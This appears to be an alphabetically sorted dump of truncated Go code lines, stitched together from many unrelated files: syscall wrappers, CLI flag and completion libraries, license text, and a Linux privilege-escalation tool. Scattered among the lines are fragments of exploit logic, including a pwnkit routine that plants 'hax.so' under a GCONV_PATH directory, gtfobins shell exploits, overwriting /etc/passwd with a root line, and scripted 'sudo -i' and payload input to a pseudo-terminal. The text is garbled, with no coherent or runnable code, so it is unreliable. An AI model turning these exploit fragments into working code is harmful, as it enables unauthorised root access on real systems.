"func socketcall(call int, a0, a1, a2, a3, a4, a5 uintptr) (n int, err syscall.Errno)"
"func socketpair(domain int, typ int, flags int, fd "
"func socketpair(domain int, typ int, proto int, fd "
"func stat(path string, edir []byte) (n int, err error) {"
"func stat(path string, st "
"func stat(path string, stat "
"func stat(path string, statLE "
"func stat(path string, statptr "
"func statfs(path string, stat "
"func statfs_freebsd12(path string, stat "
"func stringArrayConv(sval string) (interface{}, error) {"
"func stringConv(sval string) (interface{}, error) {"
"func stringInSlice(a string, list []string) bool {"
"func stringSliceConv(sval string) (interface{}, error) {"
"func stringToInt64Conv(val string) (interface{}, error) {"
"func stringToIntConv(val string) (interface{}, error) {"
"func stringToStringConv(val string) (interface{}, error) {"
"func stripFlags(args []string, c "
"func svcCall(fnptr unsafe.Pointer, argv "
"func syncFileRange2(fd int, flags int, off int64, n int64) (err error) {"
"func syscall6(trap, nargs, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_getprocaddress(handle Handle, procname "
"func syscall_rawSyscall(fn, a1, a2, a3 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_rawSyscall6(fn, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_rawsyscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_rawsyscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_rawsyscall9(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscall(fn, a1, a2, a3 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscall6(fn, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscall6X(fn, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscall9(fn, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err Errno) // 32-bit only"
"func syscall_syscall9(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err Errno)"
"func syscall_syscallPtr(fn, a1, a2, a3 uintptr) (r1, r2 uintptr, err Errno)"
"func sysctl(mib []_C_int, old "
"func sysctlNodes(mib []_C_int) (nodes []Sysctlnode, err error) {"
"func sysctlUname(mib []_C_int, old "
"func sysctlmib(name string, args ...int) ([]_C_int, error) {"
"func sysvicall6(trap, nargs, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func tmpl(w io.Writer, text string, data interface{}) error {"
"func uint16Conv(sval string) (interface{}, error) {"
"func uint32Conv(sval string) (interface{}, error) {"
"func uint64Conv(sval string) (interface{}, error) {"
"func uint8Conv(sval string) (interface{}, error) {"
"func uintConv(sval string) (interface{}, error) {"
"func uintSliceConv(val string) (interface{}, error) {"
"func unmount(filesystem string, mtm int) (err error) {"
"func utimensat(dirfd int, path string, times "
"func utimensat(fd int, path string, times "
"func utimes(path string, times "
"func utimes(path string, timeval "
"func utimes(path string, tv "
"func wait4(pid Pid_t, status "
"func wait4(pid int, wstatus "
"func wait4(pid int32, statusp "
"func waitForMultipleObjects(count uint32, handles uintptr, waitAll bool, waitMilliseconds uint32) (event uint32, err error) {"
"func waitpid(pid int, wstatus "
"func wrap(i, w int, s string) string {"
"func wrapN(i, slop int, s string) (string, string) {"
"func write(fd int, p []byte) (n int, err error) {"
"func writeArgAliases(buf io.StringWriter, cmd "
"func writeAsCSV(vals []string) (string, error) {"
"func writeCmdAliases(buf io.StringWriter, cmd "
"func writeCommands(buf io.StringWriter, cmd "
"func writeFile(handle Handle, buf []byte, done "
"func writeFlag(buf io.StringWriter, flag "
"func writeFlagHandler(buf io.StringWriter, name string, annotations map[string][]string, cmd "
"func writeFlags(buf io.StringWriter, cmd "
"func writeLocalNonPersistentFlag(buf io.StringWriter, flag "
"func writePostscript(buf io.StringWriter, name string) {"
"func writePreamble(buf io.StringWriter, name string) {"
"func writeRequiredFlag(buf io.StringWriter, cmd "
"func writeRequiredNouns(buf io.StringWriter, cmd "
"func writeShortFlag(buf io.StringWriter, flag "
"func writeWithCRLF(w io.Writer, buf []byte) (n int, err error) {"
"func writelen(fd int, buf "
"func writelen(fd int, p "
"func writev(fd int, iovs []Iovec) (n int, err error) {"
"func writevRacedetect(iovecs []Iovec, n int) {"
"func wstat(path string, edir []byte) (err error) {"
"func xattrnamespace(fullattr string) (ns int, attr string, err error) {"
"func xtob(x1, x2 byte) (byte, bool) {"
"functions such as String(), BoolVar(), and Var(), and is therefore"
"furnished to do so, subject to the following conditions:"
"futimens(int fd, const struct timespec "
"futimes(fd int, timeval "
"futimes(int fd, const struct timeval "
"futimesat(dirfd int, path string, times "
"futimesat(fildes int, path "
"gccgoRealSyscall(uintptr_t trap, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4, uintptr_t a5, uintptr_t a6, uintptr_t a7, uintptr_t a8, uintptr_t a9)"
"gccgoRealSyscallNoError(uintptr_t trap, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4, uintptr_t a5, uintptr_t a6, uintptr_t a7, uintptr_t a8, uintptr_t a9)"
"gen(buf, c)"
"genBashComp(buf, c.Name(), includeDesc)"
"genFishComp(buf, c.Name(), includeDesc)"
"genPowerShellComp(buf, c.Name(), includeDesc)"
"genZshComp(buf, c.Name(), includeDesc)"
"getNamedSecurityInfo(objectName string, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"getProcessPreferredUILanguages(flags uint32, numLanguages "
"getSecurityInfo(handle Handle, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"getSidSubAuthority(sid, idx)"
"getSystemPreferredUILanguages(flags uint32, numLanguages "
"getThreadPreferredUILanguages(flags uint32, numLanguages "
"getUserPreferredUILanguages(flags uint32, numLanguages "
"getdents(int fd, char "
"getdirent(fd int, buf []byte) (n int, err error)"
"getdirentries(fd int, buf []byte, basep "
"getdirentries_freebsd12(fd int, buf []byte, basep "
"getfsstat(buf unsafe.Pointer, size uintptr, flags int) (n int, err error) = SYS_GETFSSTAT"
"getfsstat(buf unsafe.Pointer, size uintptr, flags int) (n int, err error) = SYS_GETFSSTAT64"
"getgroups(int gidsetsize, gid_t "
"getgroups(n int, list "
"getgroups(ngid int, gid "
"gethostname(buf []byte) (n int, err error)"
"getitimer(int which, struct itimerval "
"getitimer(which int, currValue "
"getmsg(fd int, clptr "
"getpeername(fd int, rsa "
"getpeername(int fdes, struct sockaddr "
"getpeername(s Handle, rsa "
"getpriority(int which, id_t who)"
"getrlimit(int which, struct rlimit "
"getrlimit(resource int, rlim "
"getrusage(int who, struct rusage "
"getsockname(fd int, rsa "
"getsockname(int fdes, struct sockaddr "
"getsockname(s Handle, rsa "
"getsockopt(int s, int level, int name, void "
"getsockopt(s int, level int, name int, val unsafe.Pointer, vallen "
"gettid(SB), NOSPLIT, $0"
"gettimeofday(SB),NOSPLIT,$0-16"
"getxattr(path string, attr string, dest "
"gids = make([]int, n)"
"global flags, assign a flag as a persistent flag on the root."
"go func() { _, _ = io.Copy(ptmx, os.Stdin) }()"
"go tool cgo -godefs -- ""$@"" _const.go >_error.out"
"go-version is a library for parsing versions and version constraints,"
"goarch: ""386"","
"goarch: ""amd64"","
"goarch: ""arm64"","
"goflag ""flag"""
"goflag.FlagSet, 0)"
"gofmt > zsyscall_illumos_$GOARCH.go"""
"gofmt >$zerrors"""
"gofmt >$zsysctl"""
"gofmt >zsyscall_$GOOSARCH.1_13.go"""
"gofmt >zsyscall_$GOOSARCH.go"""
"gofmt >zsyscall_solaris_$GOARCH.go"""
"gofmt >zsysnum_$GOOSARCH.go"""
"gofmt >ztypes_$GOOSARCH.go"""
"got, timeout)"
"group, "
"groupInfo, found := pflag.Annotations[annotation]"
"groups, err := Getgroups()"
"gtfobinsExploit) Exploit(ctx context.Context, s "
"gtfobinsExploit) IsVulnerable(_ context.Context, state "
"gtfobinsExploit) Shell(ctx context.Context, s "
"guid, "
"h, 0, false, windows.DUPLICATE_SAME_ACCESS)"
"h, Data: dbuf}"
"h, dbuf, err := socketControlMessageHeaderAndData(b[i:])"
"h, e := CreateFile(pathp, access, sharemode, sa, createmode, attrs, 0)"
"h, e := CreateFile(pathp,"
"h, e := syscall_loadlibrary(namep)"
"h, err := LoadLibraryEx(loadDLL, 0, flags)"
"hand-written Go files which implement system calls (for unix, the specific OS,"
"handle, err = findFirstFile1(name, "
"handlers := strings.Join(value, """
"hash := os.NewFile(hashfd, ""sha1"")"
"hashfd, _, _ := unix.Syscall(unix.SYS_ACCEPT, uintptr(fd), 0, 0)"
"hdtr, off_t "
"helpVal, err := c.Flags().GetBool(""help"")"
"hex.Encode(dst, uuid[:4])"
"hex.Encode(dst[14:18], uuid[6:8])"
"hex.Encode(dst[19:23], uuid[8:10])"
"hex.Encode(dst[24:], uuid[10:])"
"hex.Encode(dst[9:13], uuid[4:6])"
"hi, w)"
"hidden:    """
"hint, const void "
"historyIndex: -1,"
"home, err := os.UserHomeDir()"
"however, there are tools that automate much of the process."
"https://github.com/golang/go/issues. Prefix your issue with ""x/term:"" in the"
"i := bytes.IndexByte(buf, '"
"i := bytes.IndexByte(n, 0)"
"i := bytes.IndexByte(s, 0)"
"i := sort.Search(len(errorList), func(i int) bool {"
"i := sort.Search(len(signalList), func(i int) bool {"
"i := sort.Search(len(sysctlMib), func(i int) bool {"
"i := strings.Index(name, "" "")"
"i), 10) }"
"i, e := t.getInfo(TokenGroups, 50)"
"i, e := t.getInfo(TokenPrimaryGroup, 50)"
"i, e := t.getInfo(TokenUser, 50)"
"i, err := flagset.GetInt(""flagname"")"
"i, err := rightToIndex(right)"
"i, err := s.fromString(val)"
"i, err := strconv.Atoi(sval)"
"i, err := strconv.Atoi(val)"
"icCmd:     ISPTM,"
"icCmd:     OWNERPT,"
"icCmd:     UNLKPT,"
"icDP:      nil,"
"icLen:     0,"
"icLen:     int32(unsafe.Sizeof(strioctl{})),"
"icTimeout: 0,"
"id, const void "
"id, err := ParseBytes(data)"
"id, int cmd, "
"id, int flags)"
"id, int type, void "
"id, void "
"ident, clockid_t clock_id, const struct timespec "
"ident, int n)"
"idp, const char "
"idp, unsigned int value)"
"if !bytes.Equal(bytes.ToLower(b[:9]), []byte(""urn:uuid:"")) {"
"if !hasAllFlags(flags, flagnames...) {"
"if !prereleaseCheck(v, c) "
"if !s.IsPackageInstalled(""gnome-control-center"") "
"if !s.IsPackageInstalled(""packagekit"") {"
"if !stringInSlice(v, validArgs) {"
"if (entry.UserName == ""root"" "
"if (requiredAnnotation[0] == ""true"") "
"if (runtime.GOOS == ""darwin"" "
"if MousetrapHelpText != """" "
"if [ ""$GOOSARCH"" == ""aix_ppc64"" ]"
"if [ ""$funcstack[1]"" = ""_%[1]s"" ]"
"if [ -n ""$mkasm"" ]"
"if [ -n ""$mkerrors"" ]"
"if [ -n ""$mksyscall"" ]"
"if [ -n ""$mksysctl"" ]"
"if [ -n ""$mksysnum"" ]"
"if [ -n ""$mktypes"" ]"
"if [[ ""$GOOS"" = ""aix"" ]]"
"if [[ ""$GOOS"" = ""linux"" ]] "
"if [[ ""$GOOS"" = ""linux"" ]]"
"if [[ ""$GOOS"" = ""solaris"" ]]"
"if [[ $(type -t compopt) = ""builtin"" ]]"
"if _, _, errno := sysvicall6(uintptr(unsafe.Pointer("
"if _, err := exec.LookPath(""cc"")"
"if _, err := exec.LookPath(""pkexec"")"
"if _, err := exec.LookPath(v.binaryName)"
"if _, err := file.Write(input)"
"if _, err := io.Copy(tarWriter, strings.NewReader(dockerfile))"
"if _, err := io.ReadFull(rander, b)"
"if _, err := ioutil.ReadAll(resp.Body)"
"if _, err := os.Stat(path)"
"if _, err := p.writer.Write([]byte(resetAll))"
"if _, err := ptmx.Write([]byte(""sudo -i"
"if _, err := ptmx.Write([]byte(fmt.Sprintf(""%s"
"if _, err := ptmx.Write([]byte(input))"
"if _, err := ptmx.Write([]byte(payload))"
"if _, err := ptmx.Write([]byte{0x0a})"
"if _, err := ptmx.Write([]byte{0x0d, 0x0a})"
"if _, err := ptsdev(f.Fd())"
"if _, err := tempFile.Write([]byte(v.tmpFileContent))"
"if _, err = t.c.Write(t.outBuf)"
"if _, err = w.Write(crlf)"
"if _, exists := flagCompletionFunctions[flag]"
"if _, found := e.fds[fd]"
"if _, found := e.paths[path]"
"if _, isFg := fgTags[name]"
"if _, ok := ep.fds[fd]"
"if _, ok := flagErr.("
"if _, present := flag.Annotations[BashCompOneRequiredFlag]"
"if _, set := f.actual[fname]"
"if activeHelpLevel != ""off""  {"
"if activeHelpLevel != ""off"" {"
"if activeHelpLevel == ""local"" {"
"if attr, ok := attrTags[name]"
"if bytes.Equal(data, jsonNull) {"
"if c.Flags().Lookup(""help"") == nil {"
"if c.Flags().Lookup(""version"") == nil {"
"if c.Flags().ShorthandLookup(""v"") == nil {"
"if c.Name() == """" {"
"if c.Version != """" {"
"if c.Version == """" {"
"if c.helpTemplate != """" {"
"if c.usageTemplate != """" {"
"if c.versionTemplate != """" {"
"if cfgFile != """" {"
"if cmd.commandCalledAs.name == """" {"
"if container.ID == """" {"
"if d.Gid, b, ok = gstring(b)"
"if d.Muid, b, ok = gstring(b)"
"if d.Name == ""kernel32.dll"" {"
"if d.Name, b, ok = gstring(b)"
"if d.Uid, b, ok = gstring(b)"
"if data == """" {"
"if deviceDescription != """" {"
"if disclosure, ok := exploit.Vulnerability.(exploits.Disclosure)"
"if e := checkTokenMembership(t, sid, "
"if enumerator != """" {"
"if err := ExactArgs(n)(cmd, args)"
"if err := Faccessat2(dirfd, path, mode, flags)"
"if err := Fstatat(dirfd, path, "
"if err := Setsize(pty, sz)"
"if err := Setsize(tty, size)"
"if err := Statx(fd, path, AT_NO_AUTOMOUNT"
"if err := c.Flags().SetAnnotation(v, mutuallyExclusive, append(f.Annotations[mutuallyExclusive], strings.Join(flagNames, "" "")))"
"if err := c.Flags().SetAnnotation(v, requiredAsGroup, append(f.Annotations[requiredAsGroup], strings.Join(flagNames, "" "")))"
"if err := c.PostRunE(c, argWoFlags)"
"if err := c.PreRunE(c, argWoFlags)"
"if err := c.RunE(c, argWoFlags)"
"if err := disclosure.Disclose(ctx, localState, exploitLogger)"
"if err := exec.Command(platform.binary, append(platform.args, ""/tmp/traitor.so"", sourcePath)...).Run()"
"if err := getitimer(int(which), "
"if err := ioctl(f.Fd(), I_FIND, uintptr(unsafe.Pointer("
"if err := ioctl(f.Fd(), I_STR, uintptr(unsafe.Pointer("
"if err := ioctl(f.Fd(), ioctlFIODGNAME, uintptr(unsafe.Pointer("
"if err := ioctl(f.Fd(), uintptr(ioctl_TIOCPTSNAME), uintptr(unsafe.Pointer("
"if err := ioctl(fd, I_STR, uintptr(unsafe.Pointer("
"if err := ioctl(p.Fd(), uintptr(ioctl_PTMGET), uintptr(unsafe.Pointer("
"if err := ioctl(t.Fd(), syscall.TIOCGWINSZ, uintptr(unsafe.Pointer("
"if err := ioctlPtr(fd, SIOCKCMCLONE, unsafe.Pointer("
"if err := ioutil.WriteFile(filepath.Join(dir, ""GCONV_PATH=."", ""hax.so:.""), []byte("""
"if err := ioutil.WriteFile(filepath.Join(dir, ""gconv-modules""), []byte(""module UTF-8// HAX// hax 1"
"if err := ioutil.WriteFile(soPath, output.Bytes(), 0755)"
"if err := ioutil.WriteFile(sourcePath, []byte(pwnkitSrc), 0600)"
"if err := ioutil.WriteFile(srcPath, []byte(src), 0600)"
"if err := json.Unmarshal(data, "
"if err := lockable.WaitForString("""
"if err := lockable.WaitForString(""Password:"", time.Second"
"if err := lockable.WaitForString(""Sorry, try again."", time.Second"
"if err := lockable.WaitForString(""[sudo] password for"", time.Second"
"if err := lockable.WaitForString(""su: Authentication failure"", time.Second"
"if err := os.Chmod(path, 0777"
"if err := os.Chown(path, 0, 0)"
"if err := os.MkdirAll(filepath.Join(dir, ""GCONV_PATH=.""), 0777)"
"if err := p.PersistentPostRunE(c, argWoFlags)"
"if err := p.PersistentPreRunE(c, argWoFlags)"
"if err := parg(cmd, args)"
"if err := setitimer(int(which), "
"if err := sheller.Shell(ctx, localState, exploitLogger)"
"if err := streamsPush(t, mod)"
"if err := syscall.Access(candidate, unix.W_OK)"
"if err := syscall.Access(fn, 0)"
"if err := syscall.Fstat(int(fd), "
"if err := sysctl(mib, "
"if err := sysctl(mib, ("
"if err := sysctl(mib, nil, "
"if err := sysctlUname(mib, "
"if err := unix.IoctlSetTermios(fd, ioctlWriteTermios, "
"if err := unix.IoctlSetTermios(fd, ioctlWriteTermios, termios)"
"if err := v.Exploit(ctx, s, log.Silenced(), payloads.Payload(""true""))"
"if err := v.exploitWithImage(image, false, payload, log)"
"if err := v.installPackage(""accountsservice"", s, log)"
"if err := v.installPackage(""gnome-control-center"", s, log)"
"if err := v.writeSharedObject(filepath.Join(dir, ""hax.so""), aggressive, log)"
"if err := v.writeToFile(""/etc/passwd"", 4, []byte(rootLine[4:]))"
"if err := windows.DuplicateHandle(p, windows.Handle(fd), p, "
"if err := windows.GetConsoleMode(windows.Handle(fd), "
"if err := windows.GetConsoleScreenBufferInfo(windows.Handle(fd), "
"if err := windows.SetConsoleMode(windows.Handle(fd), raw)"
"if err := windows.SetConsoleMode(windows.Handle(fd), st)"
"if err = Process32First(snapshot, "
"if err = getmsg(fd, clp, datap, "
"if err = getpeername(fd, "
"if err = getsockname(fd, "
"if err = syscall.Process32First(snapshot, "
"if err = sysctl([]_C_int{0, 3}, p, "
"if err = sysctl(mib, nil, "
"if err = sysctl(mib, np, "
"if errors.Is(err, flag.ErrHelp) {"
"if esc, ok := bgTags[name]"
"if esc, ok := fgTags[name]"
"if exploit.Vulnerability.IsVulnerable(ctx, localState, exploitLogger) {"
"if exploitName != """" "
"if exploitName == """" "
"if fCookie, ok := e.cookies[cookie]"
"if flag.Deprecated != """" {"
"if flag.NoOptDefVal != """
"if flag.NoOptDefVal != """" {"
"if flag.NoOptDefVal != ""true"" {"
"if flag.Shorthand != """" "
"if flag.Shorthand == """" {"
"if flag.ShorthandDeprecated != """" {"
"if flag.Value.Type() != ""bool"" {"
"if flag.Value.Type() == ""string"" {"
"if fobj, ok := e.fds[peExt.Fd]"
"if fobj, ok := e.paths[peExt.Path]"
"if fv, ok := goflag.Value.(goBoolFlag)"
"if i := bytes.IndexByte(s, 0)"
"if iname != """" "
"if index := strings.Index(lastArg, ""="")"
"if index := strings.Index(prevArg, ""="")"
"if keyType == """" {"
"if len(s) == 2 { // ""--"" terminates the flags"
"if line == """" {"
"if logger.title != """" {"
"if machineName != """" {"
"if n, err := w.Write(data)"
"if n, err = recvfrom(fd, p, flags, "
"if n, err = recvmsg(fd, "
"if n, err = sendmsg(fd, "
"if n, err = writeWithCRLF(t.c, buf)"
"if name == """" {"
"if path := os.Getenv(""BASH_COMP_DEBUG_FILE"")"
"if path == """" {"
"if pathname == """" {"
"if payload != """" {"
"if pre == """" {"
"if preOther == """" {"
"if preSelf == """" "
"if preSelf == """" {"
"if pv, ok := v.(Value)"
"if reflect.DeepEqual(segmentsSelf, segmentsOther) {"
"if ret := cm_Get_Device_Interface_List(interfaceClass, deviceID16, "
"if runtime.GOARCH == ""arm"" "
"if runtime.GOARCH == ""arm"" {"
"if runtime.GOOS != ""windows"" {"
"if runtime.GOOS == ""dragonfly"" "
"if runtime.GOOS == ""netbsd"" "
"if runtime.GOOS == ""windows"" {"
"if s == """
"if setuidShellCmd != """" {"
"if sheller, ok := exploit.Vulnerability.(exploits.ShellDropper)"
"if src == """" {"
"if str != """" {"
"if string(name) == ""."" "
"if string(passwdData[:4]) != ""root"" {"
"if strings.Contains(line, ""may run the following"") {"
"if strings.Contains(s, stringToAppend) {"
"if strings.Contains(string(l.received), expected) {"
"if strings.EqualFold(typedName, explicitSuggestion) {"
"if strings.HasPrefix(alias, prefix) {"
"if strings.HasPrefix(argAlias, toComplete) {"
"if strings.HasPrefix(c.Name(), prefix) {"
"if strings.HasPrefix(comp, activeHelpMarker) {"
"if strings.HasPrefix(flagName, toComplete) {"
"if strings.HasPrefix(lastArg[:index], ""--"") {"
"if strings.HasPrefix(line, ""ID="") {"
"if strings.HasPrefix(line, ""VERSION="") {"
"if strings.HasPrefix(name, ""/"") {"
"if strings.HasPrefix(prevArg, ""--"") {"
"if strings.HasPrefix(shorthands, ""test."") {"
"if strings.HasPrefix(subCmd.Name(), toComplete) {"
"if strings.HasPrefix(validArg, toComplete) {"
"if strings.IndexByte(s, 0) != -1 {"
"if strings.ToLower(s[:9]) != ""urn:uuid:"" {"
"if subDir, present := flag.Annotations[BashCompSubdirsInDir]"
"if syscall.Access(v.sockPath, syscall.O_RDWR) != nil {"
"if targetDir, err := os.UserHomeDir()"
"if test -z ""$GOARCH"" -o -z ""$GOOS"""
"if type -q ""%[2]s"""
"if usageMessage == """" {"
"if user, err := user.Current()"
"if v.metadata != """" {"
"if v.pre != """" {"
"if v.tmpFileContent != """" {"
"if val == """" {"
"if validExts, present := flag.Annotations[BashCompFilenameExt]"
"if value == """" {"
"if varname != """" {"
"if versionBits[0] != ""0"" "
"if w.Msg == ""''"" {"
"if win32Error, ok := ret.Unwrap().(Errno)"
"if you are using the new build system, the scripts/programs cannot be called normally."
"ifeq (, $(shell which golangci-lint))"
"ifeq (, $(shell which richgo))"
"ifname = ""random"""
"ifname = ""user"""
"ifr, err := NewIfreq(ifname)"
"ifr.raw.Ifru[:SizeofSockaddrInet4][0]),"
"ifreq, err"
"image, me, path)"
"imageList = append(imageList, image.Tags...)"
"images, err := v.listLocalImages()"
"implementation of Go, where such license applies only to those patent"
"import ""C"""
"import ""errors"""
"import ""fmt"""
"import ""github.com/liamg/tml"""
"import ""github.com/spf13/cobra"""
"import ""golang.org/x/sys/unix"""
"import ""io"""
"import ""net"""
"import ""os"""
"import ""os/exec"""
"import ""runtime"""
"import ""strconv"""
"import ""sync"""
"import ""syscall"""
"import ""time"""
"import ""unsafe"""
"import _ ""unsafe"""
"import flag ""github.com/spf13/pflag"""
"in the Software without restriction, including without limitation the rights"
"in, fd_set "
"inFlag = !hasNoOptDefVal(arg[2:], c.Flags())"
"iname, addr := getHardwareInterface(name) // null implementation for js"
"inbufp, size_t inbuflen, void "
"include ""textflag.h"""
"independent sets of flags, such as to implement subcommands"
"indirect=""includes_$(uname)"""
"infFileName16, err := UTF16PtrFromString(infFileName)"
"info, const struct timespec "
"info, err := os.Stat(path)"
"info, nil"
"info, size_t infosize)"
"info, struct timespec "
"infringement, or inducement of patent infringement, then any patent"
"initializers = append(initializers, y...)"
"inner: v,"
"ino, ok := direntIno(rec)"
"input, err := ioutil.ReadFile(setuidShellSrcPath)"
"input:  input,"
"inputs:         inputs,"
"int = flag.Int(""flagname"", 1234, ""help message for flagname"")"
"int accept(int, uintptr_t, uintptr_t)"
"int bind(int, uintptr_t, uintptr_t)"
"int connect(int, uintptr_t, uintptr_t)"
"int dup2(int, int)"
"int faccessat(int, uintptr_t, unsigned int, int)"
"int fchmod(int, unsigned int)"
"int fchmodat(int, uintptr_t, unsigned int, int)"
"int fchown(int, int, int)"
"int fchownat(int, uintptr_t, int, int, int)"
"int fcntl(uintptr_t, int, uintptr_t)"
"int fstat(int, uintptr_t)"
"int fstatat(int, uintptr_t, uintptr_t, int)"
"int fstatfs(int, uintptr_t)"
"int fsync_range(int, int, long long, long long)"
"int ftruncate(int, long long)"
"int getcwd(uintptr_t, size_t)"
"int getdirent(int, uintptr_t, size_t)"
"int getgroups(int, uintptr_t)"
"int getpeername(int, uintptr_t, uintptr_t)"
"int getpriority(int, int)"
"int getrlimit(int, uintptr_t)"
"int getrlimit64(int, uintptr_t)"
"int getrusage(int, uintptr_t)"
"int getsockname(int, uintptr_t, uintptr_t)"
"int getsockopt(int, int, int, uintptr_t, uintptr_t)"
"int gettimeofday(uintptr_t, uintptr_t)"
"int i, e"
"int i, j, e"
"int ioctl(int, int, uintptr_t)"
"int kill(int, int)"
"int lchown(uintptr_t, int, int)"
"int listen(int, int)"
"int lstat(uintptr_t, uintptr_t)"
"int madvise(uintptr_t, size_t, int)"
"int mkdir(int, uintptr_t, unsigned int)"
"int mkdirat(int, uintptr_t, unsigned int)"
"int mkfifo(uintptr_t, unsigned int)"
"int mknod(uintptr_t, unsigned int, int)"
"int mknodat(int, uintptr_t, unsigned int, int)"
"int mlock(uintptr_t, size_t)"
"int mprotect(uintptr_t, size_t, int)"
"int msync(uintptr_t, size_t, int)"
"int munlock(uintptr_t, size_t)"
"int munmap(uintptr_t, uintptr_t)"
"int nanosleep(uintptr_t, uintptr_t)"
"int nrecvmsg(int, uintptr_t, int)"
"int nsendmsg(int, uintptr_t, int)"
"int open64(uintptr_t, int, unsigned int)"
"int openat(int, uintptr_t, int, unsigned int)"
"int poll(uintptr_t, int, int)"
"int posix_fadvise64(int, long long, long long, int)"
"int pread64(int, uintptr_t, size_t, long long)"
"int pselect(int, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t)"
"int pwrite64(int, uintptr_t, size_t, long long)"
"int read(int, uintptr_t, size_t)"
"int readlink(uintptr_t, uintptr_t, size_t)"
"int recvfrom(int, uintptr_t, size_t, int, uintptr_t, uintptr_t)"
"int renameat(int, uintptr_t, int, uintptr_t)"
"int select(int, uintptr_t, uintptr_t, uintptr_t, uintptr_t)"
"int sendto(int, uintptr_t, size_t, int, uintptr_t, uintptr_t)"
"int setdomainname(uintptr_t, size_t)"
"int setgroups(int, uintptr_t)"
"int sethostname(uintptr_t, size_t)"
"int setpgid(int, int)"
"int setpriority(int, int, int)"
"int setregid(int, int)"
"int setreuid(int, int)"
"int setrlimit(int, uintptr_t)"
"int setrlimit64(int, uintptr_t)"
"int setsockopt(int, int, int, uintptr_t, uintptr_t)"
"int shutdown(int, int)"
"int socket(int, int, int)"
"int socketpair(int, int, int, uintptr_t)"
"int stat(uintptr_t, uintptr_t)"
"int statfs(uintptr_t, uintptr_t)"
"int statx(int, uintptr_t, int, int, uintptr_t)"
"int syslog(int, uintptr_t, size_t)"
"int truncate(uintptr_t, long long)"
"int unlinkat(int, uintptr_t, int)"
"int ustat(int, uintptr_t)"
"int utime(uintptr_t, uintptr_t)"
"int utimensat(int, uintptr_t, uintptr_t, int)"
"int utimes(uintptr_t, uintptr_t)"
"int wait4(int, uintptr_t, int, uintptr_t)"
"int write(int, uintptr_t, size_t)"
"int, name string, usage string) {"
"int, name string, value int, usage string) {"
"int, name, shorthand string, usage string) {"
"int, name, shorthand string, value int, usage string) {"
"int16, name string, value int16, usage string) {"
"int16, name, shorthand string, value int16, usage string) {"
"int32) (n int32, err error) [failretval==-1] = ws2_32.recvfrom"
"int32) (n int32, err error) {"
"int32, name string, value int32, usage string) {"
"int32, name, shorthand string, value int32, usage string) {"
"int32, overlapped "
"int32, protocolBuffer "
"int32, rrsa "
"int32, whence uint32) (newlowoffset uint32, err error) [failretval==0xffffffff]"
"int32, whence uint32) (newlowoffset uint32, err error) {"
"int32SliceValue) fromString(val string) (int32, error) {"
"int32Value, "
"int64(0),"
"int64, attributes uint32, share uint32, disposition uint32, options uint32, eabuffer uintptr, ealength uint32) (ntstatus error) = ntdll.NtCreateFile"
"int64, attributes uint32, share uint32, disposition uint32, options uint32, eabuffer uintptr, ealength uint32) (ntstatus error) {"
"int64, count int) (written int, err error) = SYS_SENDFILE64"
"int64, count int) (written int, err error) = libsendfile.sendfile"
"int64, count int) (written int, err error) {"
"int64, count int) (written int, err error)"
"int64, hdtr unsafe.Pointer, flags int) (err error) {"
"int64, hdtr unsafe.Pointer, flags int) (err error)"
"int64, len int, flags int) (n int, err error) {"
"int64, len int, flags int) (n int, err error)"
"int64, len int, flags int) (n int64, err error) {"
"int64, len int, flags int) (n int64, err error)"
"int64, name string, value int64, usage string) {"
"int64, name, shorthand string, value int64, usage string) {"
"int64, wfd int, woff "
"int64SliceValue) fromString(val string) (int64, error) {"
"int64Value, "
"int8), not ("
"int8, name string, value int8, usage string) {"
"int8, name, shorthand string, value int8, usage string) {"
"int8Value, "
"intSliceValue, "
"intValue, "
"interact""},"
"interfaces = append(interfaces, UTF16ToString(buf[i:j]))"
"interfaces, err = net.Interfaces()"
"interspersed:  true,"
"io.Copy(os.Stdout, f)"
"io.WriteString(t.c, """
"ioDesc := PtraceIoDesc{Op: int32(req), Offs: ("
"ioDesc)), 0)"
"ioctl(fd int, req uint, arg uintptr) (err error) = SYS_IOCTL"
"ioctl(fd int, req uint, arg uintptr) (err error)"
"ioctl(int fd, u_long com, ... void "
"ioctlFIODGNAME    = _IOW('f', 120, unsafe.Sizeof(emptyFiodgnameArg))"
"ioctlPtr(fd int, req uint, arg unsafe.Pointer) (err error) = SYS_IOCTL"
"ioctlRet(fd int, req uint, arg uintptr) (ret int, err error) = libc.ioctl"
"ioctl_FIODNAME    = _IOW('f', 120, unsafe.Sizeof(emptyFiodgnameArg))"
"iov, int iovlen, caddr_t to, __socklen_t tolen, struct sctp_sndrcvinfo "
"iov, int iovlen, struct sockaddr "
"iovecs := make([]Iovec, len(bs))"
"iovp, int iovcnt)"
"iovp, int iovcnt, int PAD, off_t offset)"
"iovp, int iovcnt, int flags, off_t offset)"
"iovp, int iovcnt, int pad, off_t offset)"
"iovp, u_int iovcnt)"
"iovp, u_int iovcnt, off_t offset)"
"iovp, unsigned int iovcnt, int flags)"
"ipMaskValue, "
"ipSliceValue) fromString(val string) (net.IP, error) {"
